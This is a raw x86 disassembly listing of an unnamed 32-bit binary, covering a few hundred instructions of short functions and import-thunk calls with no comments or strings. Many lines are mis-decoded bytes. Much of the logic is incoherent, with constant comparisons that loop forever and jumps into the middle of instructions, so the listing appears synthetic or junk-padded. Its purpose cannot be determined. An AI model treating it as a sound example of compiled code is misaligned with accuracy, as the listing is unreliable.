  4d10cc:	push   0x0
  4d10ce:	call   0x4d08c4
  4d10d3:	add    esp,0x4
  4d10d6:	pop    edi
  4d10d7:	add    esp,0x2c
  4d10da:	pop    ebp
  4d10db:	ret    
  4d10dc:	pop    edi
  4d10dd:	call   DWORD PTR ds:0x4d2048
  4d10e3:	call   edi
  4d10e5:	add    BYTE PTR [eax],al
  4d10e7:	add    BYTE PTR [edi-0x1],bl
  4d10ea:	adc    eax,0x4d203c
  4d10ef:	call   edi
  4d10f1:	add    BYTE PTR [eax],al
  4d10f3:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d10f9:	sub    esp,0x1c
  4d10fc:	lea    ecx,[ebx+0x38]
  4d10ff:	xor    ebx,eax
  4d1101:	push   ecx
  4d1102:	push   DWORD PTR [ecx+0x58]
  4d1105:	push   DWORD PTR [ecx+0xbc]
  4d110b:	call   0x4d07e0
  4d1110:	add    esp,0x8
  4d1113:	pop    ecx
  4d1114:	push   ecx
  4d1115:	mov    ecx,0x0
  4d111a:	push   ecx
  4d111b:	call   0x4d0868
  4d1120:	add    esp,0x4
  4d1123:	pop    ecx
  4d1124:	push   ecx
  4d1125:	mov    eax,0xfffffff4
  4d112a:	push   eax
  4d112b:	call   0x4d1238
  4d1130:	add    esp,0x4
  4d1133:	pop    ecx
  4d1134:	add    esp,0x1c
  4d1137:	pop    ebp
  4d1138:	ret    
  4d1139:	add    BYTE PTR [eax],al
  4d113b:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d1141:	sub    esp,0x28
  4d1144:	lea    edx,ds:0x4d319c
  4d114a:	sub    ecx,DWORD PTR [ebp-0x18]
  4d114d:	push   edx
  4d114e:	push   eax
  4d114f:	push   DWORD PTR [edx+0xe4]
  4d1155:	push   DWORD PTR [edx+0x154]
  4d115b:	call   0x4d06f8
  4d1160:	add    esp,0xc
  4d1163:	pop    edx
  4d1164:	push   edx
  4d1165:	push   0x0
  4d1167:	call   0x4d0e00
  4d116c:	add    esp,0x4
  4d116f:	pop    edx
  4d1170:	push   edx
  4d1171:	call   0x4d0b90
  4d1176:	add    esp,0x4
  4d1179:	pop    edx
  4d117a:	add    esp,0x28
  4d117d:	pop    ebp
  4d117e:	ret    
  4d117f:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d1185:	sub    esp,0x38
  4d1188:	lea    ebx,[eax+0x120]
  4d118e:	mov    edi,DWORD PTR [ebx-0x17c]
  4d1194:	push   ebx
  4d1195:	push   DWORD PTR [ebx+0xc4]
  4d119b:	push   DWORD PTR [ebx+0xd4]
  4d11a1:	push   DWORD PTR [ebx+0xf4]
  4d11a7:	push   esi
  4d11a8:	call   0x4d09e0
  4d11ad:	add    esp,0x10
  4d11b0:	pop    ebx
  4d11b1:	mov    esi,0x0
  4d11b6:	push   esi
  4d11b7:	call   0x4d0868
  4d11bc:	add    esp,0x4
  4d11bf:	mov    edi,0xfffffff4
  4d11c4:	push   edi
  4d11c5:	call   0x4d1238
  4d11ca:	add    esp,0x4
  4d11cd:	add    esp,0x38
  4d11d0:	pop    ebp
  4d11d1:	ret    
  4d11d2:	add    BYTE PTR [eax],al
  4d11d4:	mov    edi,edi
  4d11d6:	push   ebp
  4d11d7:	mov    ebp,esp
  4d11d9:	sub    esp,0x28
  4d11dc:	mov    ebx,0x4d31a4
  4d11e1:	cmp    ebx,0x6545
  4d11e7:	jb     0x4d11d7
  4d11e9:	push   ebx
  4d11ea:	push   DWORD PTR [ebx+0x9c]
  4d11f0:	push   DWORD PTR [ebx+0x170]
  4d11f6:	push   DWORD PTR [ebx+0x2c]
  4d11f9:	call   0x4d14c4
  4d11fe:	add    esp,0xc
  4d1201:	pop    ebx
  4d1202:	call   0x4d0874
  4d1207:	add    esp,0x4
  4d120a:	mov    ecx,0x0
  4d120f:	push   ecx
  4d1210:	call   0x4d1348
  4d1215:	add    esp,0x4
  4d1218:	add    esp,0x28
  4d121b:	pop    ebp
  4d121c:	ret    
  4d121d:	add    BYTE PTR [eax],al
  4d121f:	add    BYTE PTR [edi-0x1],bl
  4d1222:	adc    eax,0x4d2090
  4d1227:	call   edi
  4d1229:	add    BYTE PTR [eax],al
  4d122b:	add    BYTE PTR [edi-0x1],bl
  4d122e:	adc    eax,0x4d2058
  4d1233:	call   edi
  4d1235:	add    BYTE PTR [eax],al
  4d1237:	add    BYTE PTR [edi-0x1],bl
  4d123a:	adc    eax,0x4d202c
  4d123f:	call   edi
  4d1241:	add    BYTE PTR [eax],al
  4d1243:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d1249:	sub    esp,0x60
  4d124c:	lea    edx,[eax-0x90]
  4d1252:	xor    esi,edx
  4d1254:	push   edx
  4d1255:	mov    eax,0x0
  4d125a:	push   eax
  4d125b:	call   0x4d08b8
  4d1260:	add    esp,0x4
  4d1263:	pop    edx
  4d1264:	push   edx
  4d1265:	push   DWORD PTR [edx+0x1d8]
  4d126b:	push   DWORD PTR [edx+0xb0]
  4d1271:	call   0x4d08d0
  4d1276:	add    esp,0x8
  4d1279:	pop    edx
  4d127a:	push   edx
  4d127b:	mov    edi,0x0
  4d1280:	push   edi
  4d1281:	call   0x4d0e00
  4d1286:	add    esp,0x4
  4d1289:	pop    edx
  4d128a:	add    esp,0x60
  4d128d:	pop    ebp
  4d128e:	ret    
  4d128f:	add    BYTE PTR [edi-0x1],bl
  4d1292:	adc    eax,0x4d2084
  4d1297:	call   edi
  4d1299:	add    BYTE PTR [eax],al
  4d129b:	add    BYTE PTR [edi-0x1],bl
  4d129e:	adc    eax,0x4d2000
  4d12a3:	call   edi
  4d12a5:	add    BYTE PTR [eax],al
  4d12a7:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d12ad:	sub    esp,0x2c
  4d12b0:	lea    eax,ds:0x4d3150
  4d12b6:	adc    DWORD PTR [ebp-0x1c],0x2cdc
  4d12bd:	push   eax
  4d12be:	push   DWORD PTR [eax+0x1dc]
  4d12c4:	push   DWORD PTR [eax+0xdc]
  4d12ca:	push   DWORD PTR [eax+0x17c]
  4d12d0:	call   0x4d11d4
  4d12d5:	add    esp,0xc
  4d12d8:	pop    eax
  4d12d9:	push   eax
  4d12da:	mov    edi,0x0
  4d12df:	push   edi
  4d12e0:	call   0x4d1044
  4d12e5:	add    esp,0x4
  4d12e8:	pop    eax
  4d12e9:	push   eax
  4d12ea:	mov    ecx,0x0
  4d12ef:	push   ecx
  4d12f0:	call   0x4d08c4
  4d12f5:	add    esp,0x4
  4d12f8:	pop    eax
  4d12f9:	add    esp,0x2c
  4d12fc:	pop    ebp
  4d12fd:	ret    
  4d12fe:	add    BYTE PTR [eax],al
  4d1300:	mov    edi,edi
  4d1302:	push   ebp
  4d1303:	mov    ebp,esp
  4d1305:	sub    esp,0x40
  4d1308:	mov    eax,0x4d3128
  4d130d:	adc    esi,DWORD PTR [ebp-0x2c]
  4d1310:	push   eax
  4d1311:	push   0x0
  4d1313:	call   0x4d10e8
  4d1318:	add    esp,0x4
  4d131b:	pop    eax
  4d131c:	push   eax
  4d131d:	push   DWORD PTR [eax+0xc0]
  4d1323:	push   edx
  4d1324:	push   DWORD PTR [eax+0x14]
  4d1327:	push   DWORD PTR [eax+0x1c0]
  4d132d:	call   0x4d0e0c
  4d1332:	add    esp,0x10
  4d1335:	pop    eax
  4d1336:	push   eax
  4d1337:	push   0x0
  4d1339:	call   0x4d08b8
  4d133e:	add    esp,0x4
  4d1341:	pop    eax
  4d1342:	add    esp,0x40
  4d1345:	pop    ebp
  4d1346:	ret    
  4d1347:	add    BYTE PTR [edi-0x1],bl
  4d134a:	adc    eax,0x4d2068
  4d134f:	call   edi
  4d1351:	add    BYTE PTR [eax],al
  4d1353:	add    BYTE PTR [edi-0x1],bl
  4d1356:	adc    eax,0x4d2078
  4d135b:	call   edi
  4d135d:	add    BYTE PTR [eax],al
  4d135f:	add    BYTE PTR [edi-0x1],bl
  4d1362:	adc    eax,0x4d200c
  4d1367:	call   edi
  4d1369:	add    BYTE PTR [eax],al
  4d136b:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d1371:	sub    esp,0x48
  4d1374:	mov    edi,0x4d3138
  4d1379:	sub    DWORD PTR [edi-0x128],edi
  4d137f:	push   edi
  4d1380:	mov    edx,0x0
  4d1385:	push   edx
  4d1386:	call   0x4d0e00
  4d138b:	add    esp,0x4
  4d138e:	pop    edi
  4d138f:	push   edi
  4d1390:	push   DWORD PTR [edi+0x170]
  4d1396:	push   DWORD PTR [edi+0xd0]
  4d139c:	call   0x4d0fb4
  4d13a1:	add    esp,0x8
  4d13a4:	pop    edi
  4d13a5:	push   edi
  4d13a6:	call   0x4d0b90
  4d13ab:	add    esp,0x4
  4d13ae:	pop    edi
  4d13af:	add    esp,0x48
  4d13b2:	pop    ebp
  4d13b3:	ret    
  4d13b4:	mov    edi,edi
  4d13b6:	push   ebp
  4d13b7:	mov    ebp,esp
  4d13b9:	sub    esp,0x4c
  4d13bc:	lea    edi,[ebx+0x188]
  4d13c2:	and    DWORD PTR [ebp-0x14],0xffffffe1
  4d13c6:	push   edi
  4d13c7:	push   0x0
  4d13c9:	call   0x4d0868
  4d13ce:	add    esp,0x4
  4d13d1:	pop    edi
  4d13d2:	push   edi
  4d13d3:	push   eax
  4d13d4:	push   DWORD PTR [edi+0x188]
  4d13da:	push   edx
  4d13db:	call   0x4d0990
  4d13e0:	add    esp,0xc
  4d13e3:	pop    edi
  4d13e4:	push   edi
  4d13e5:	call   0x4d0d1c
  4d13ea:	add    esp,0x4
  4d13ed:	pop    edi
  4d13ee:	add    esp,0x4c
  4d13f1:	pop    ebp
  4d13f2:	ret    
  4d13f3:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d13f9:	sub    esp,0x24
  4d13fc:	lea    ecx,[ebx-0x5c]
  4d13ff:	sub    DWORD PTR [ebp-0xc],0xffffa614
  4d1406:	push   ecx
  4d1407:	push   edx
  4d1408:	push   DWORD PTR [ecx+0x98]
  4d140e:	call   0x4d0af0
  4d1413:	add    esp,0x8
  4d1416:	pop    ecx
  4d1417:	push   ecx
  4d1418:	push   0x0
  4d141a:	call   0x4d0928
  4d141f:	add    esp,0x4
  4d1422:	pop    ecx
  4d1423:	push   ecx
  4d1424:	mov    edx,0x0
  4d1429:	push   edx
  4d142a:	call   0x4d0868
  4d142f:	add    esp,0x4
  4d1432:	pop    ecx
  4d1433:	add    esp,0x24
  4d1436:	pop    ebp
  4d1437:	ret    
  4d1438:	mov    edi,edi
  4d143a:	push   ebp
  4d143b:	mov    ebp,esp
  4d143d:	sub    esp,0x40
  4d1440:	lea    ebx,[esi-0x7c]
  4d1443:	xor    edi,DWORD PTR [ebp-0x38]
  4d1446:	mov    edi,0x0
  4d144b:	push   edi
  4d144c:	call   0x4d1348
  4d1451:	add    esp,0x4
  4d1454:	push   ebx
  4d1455:	push   edi
  4d1456:	push   edi
  4d1457:	push   DWORD PTR [ebx+0x1a8]
  4d145d:	push   DWORD PTR [ebx+0x18]
  4d1460:	call   0x4d0ab4
  4d1465:	add    esp,0x10
  4d1468:	pop    ebx
  4d1469:	lea    ecx,[ebx-0xe8]
  4d146f:	push   ecx
  4d1470:	call   0x4d10dc
  4d1475:	add    esp,0x4
  4d1478:	test   eax,eax
  4d147a:	jne    0x4d146a
  4d147c:	add    esp,0x40
  4d147f:	pop    ebp
  4d1480:	ret    
  4d1481:	add    BYTE PTR [eax],al
  4d1483:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d1489:	sub    esp,0x20
  4d148c:	mov    esi,0x4d30e0
  4d1491:	adc    ecx,DWORD PTR [ebp-0x14]
  4d1494:	push   esi
  4d1495:	push   DWORD PTR [esi+0x100]
  4d149b:	push   DWORD PTR [esi+0x58]
  4d149e:	call   0x4d0f34
  4d14a3:	add    esp,0x8
  4d14a6:	pop    esi
  4d14a7:	mov    ebx,0xfffffff4
  4d14ac:	push   ebx
  4d14ad:	call   0x4d1238
  4d14b2:	add    esp,0x4
  4d14b5:	push   0x0
  4d14b7:	call   0x4d1354
  4d14bc:	add    esp,0x4
  4d14bf:	add    esp,0x20
  4d14c2:	pop    ebp
  4d14c3:	ret    
  4d14c4:	mov    edi,edi
  4d14c6:	push   ebp
  4d14c7:	mov    ebp,esp
  4d14c9:	sub    esp,0x5c
  4d14cc:	mov    edi,0x4d3018
  4d14d1:	cmp    edi,0x712c
  4d14d7:	je     0x4d14c7
  4d14d9:	push   edi
  4d14da:	mov    ecx,0x0
  4d14df:	push   ecx
  4d14e0:	call   0x4d10e8
  4d14e5:	add    esp,0x4
  4d14e8:	pop    edi
  4d14e9:	push   edi
  4d14ea:	push   edx
  4d14eb:	push   ecx
  4d14ec:	push   ebx
  4d14ed:	call   0x4d113c
  4d14f2:	add    esp,0xc
  4d14f5:	pop    edi
  4d14f6:	push   edi
  4d14f7:	mov    eax,0x0
  4d14fc:	push   eax
  4d14fd:	call   0x4d10e8
  4d1502:	add    esp,0x4
  4d1505:	pop    edi
  4d1506:	add    esp,0x5c
  4d1509:	pop    ebp
  4d150a:	ret    
  4d150b:	add    BYTE PTR [ebx-0x1374aa01],cl
  4d1511:	sub    esp,0x38
  4d1514:	lea    edi,ds:0x4d30b4
  4d151a:	adc    edx,esi
  4d151c:	push   edi
  4d151d:	call   0x4d0874
  4d1522:	add    esp,0x4
  4d1525:	pop    edi
  4d1526:	push   edi
  4d1527:	push   eax
  4d1528:	push   DWORD PTR [edi+0x12c]
  4d152e:	push   DWORD PTR [edi+0x58]
  4d1531:	push   esi
  4d1532:	call   0x4d0dbc
  4d1537:	add    esp,0x10
  4d153a:	pop    edi
  4d153b:	push   edi
  4d153c:	call   0x4d0d1c
  4d1541:	add    esp,0x4
  4d1544:	pop    edi
  4d1545:	add    esp,0x38
  4d1548:	pop    ebp
  4d1549:	ret    
  4d154a:	add    BYTE PTR [eax],al
  4d154c:	pop    edi
  4d154d:	call   DWORD PTR ds:0x4d2064
  4d1553:	call   edi
  4d1555:	add    BYTE PTR [eax],al
  4d1557:	add    BYTE PTR [edi-0x1],bl
  4d155a:	adc    eax,0x4d201c
  4d155f:	call   edi
  4d1561:	add    BYTE PTR [eax],al
  4d1563:	add    BYTE PTR [edi-0x1],bl
  4d1566:	adc    eax,0x4d2054
  4d156b:	call   edi
  4d156d:	add    BYTE PTR [eax],al
  4d156f:	add    BYTE PTR [edi-0x1],bl
  4d1572:	adc    eax,0x4d2030
  4d1577:	call   edi
  4d1579:	add    BYTE PTR [eax],al
  4d157b:	add    BYTE PTR [edi-0x1],bl
  4d157e:	adc    eax,0x4d208c
  4d1583:	call   edi
  4d1585:	add    BYTE PTR [eax],al
  4d1587:	add    BYTE PTR [edi-0x1],bl
  4d158a:	adc    eax,0x4d2070
  4d158f:	call   edi
  4d1591:	add    BYTE PTR [eax],al
  4d1593:	add    BYTE PTR [edi-0x1],bl
  4d1596:	adc    eax,0x4d2038
  4d159b:	call   edi
  4d159d:	add    BYTE PTR [eax],al
  4d159f:	add    BYTE PTR [edi-0x1],bl
  4d15a2:	adc    eax,0x4d2080
  4d15a7:	call   edi
  4d15a9:	add    BYTE PTR [eax],al
	...
